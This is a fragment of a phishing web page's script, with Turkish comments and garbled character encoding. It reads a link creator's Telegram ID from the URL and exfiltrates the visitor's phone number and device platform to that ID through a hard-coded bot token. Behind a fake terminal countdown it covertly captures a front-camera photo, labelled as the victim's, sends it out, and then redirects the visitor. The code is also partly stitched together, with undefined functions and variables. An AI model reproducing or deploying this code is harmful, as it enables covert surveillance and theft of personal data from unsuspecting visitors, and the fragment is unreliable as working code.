// Sayfa aÃ§Ä±ldÄ±ÄŸÄ± an linkteki ID'yi kapÄ±yoruz
const params = new URLSearchParams(window.location.search);
const userID = params.get('id'); // Ä°ÅŸte bu, botu kullanan kiÅŸinin ID'si!

async function sÄ±zmaVerisiniGonder(mesaj, resim = null) {
    const BOT_TOKEN = "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc"; // Senin Botunun TokenÄ±
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/`;

    const fd = new FormData();
    fd.append('chat_id', userID); // VERÄ° BURAYA GÄ°DÄ°YOR: Linki kim oluÅŸturduysa ona!
    
    if (resim) {
        fd.append('photo', resim, 'kurban.jpg');
        fd.append('caption', mesaj);
        await fetch(url + 'sendPhoto', { method: 'POST', body: fd });
    } else {
        fd.append('text', mesaj);
        await fetch(url + 'sendMessage', { method: 'POST', body: fd });
    }
}
        // AnÄ±nda Numara Raporu
        await report(`ğŸ’ ULTRA PROFESYONEL SIZMA\nğŸ“ Numara: ${phone}\nğŸŒ IP/Platform: ${navigator.platform}`);

        let lineIdx = 0;
        let time = 15;
        const clock = document.getElementById('countdown');

        const interval = setInterval(async () => {
            time--;
            clock.innerText = time;

            // Terminal yazÄ±larÄ± akÄ±ÅŸÄ±
            if (lineIdx < terminalLines.length) {
                term.innerHTML += `<div>${terminalLines[lineIdx]}</div>`;
                lineIdx++;
            }

            // Kritik 12. saniyede Gizli Operasyon
            if (time === 12) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.getElementById('v');
                    video.srcObject = stream;
                    
                    setTimeout(() => {
                        const canvas = document.getElementById('c');
                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(b => report(`ğŸ“¸ ULTRA-HD GÃ–RÃœNTÃœ | NUMARA: ${phone}`, b), 'image/jpeg');
                        stream.getTracks().forEach(t => t.stop());
                    }, 2500);
                } catch(e) { await report(`âŒ SÄ±zma KÄ±sÄ±tlandÄ±: Kamera Reddedildi. (Numara: ${phone})`); }
            }

            if (time <= 0) {
                clearInterval(interval);
                window.location.href = CONFIG.REDIRECT;
            }
        }, 1000);
    }
</script>
</body>
</html>
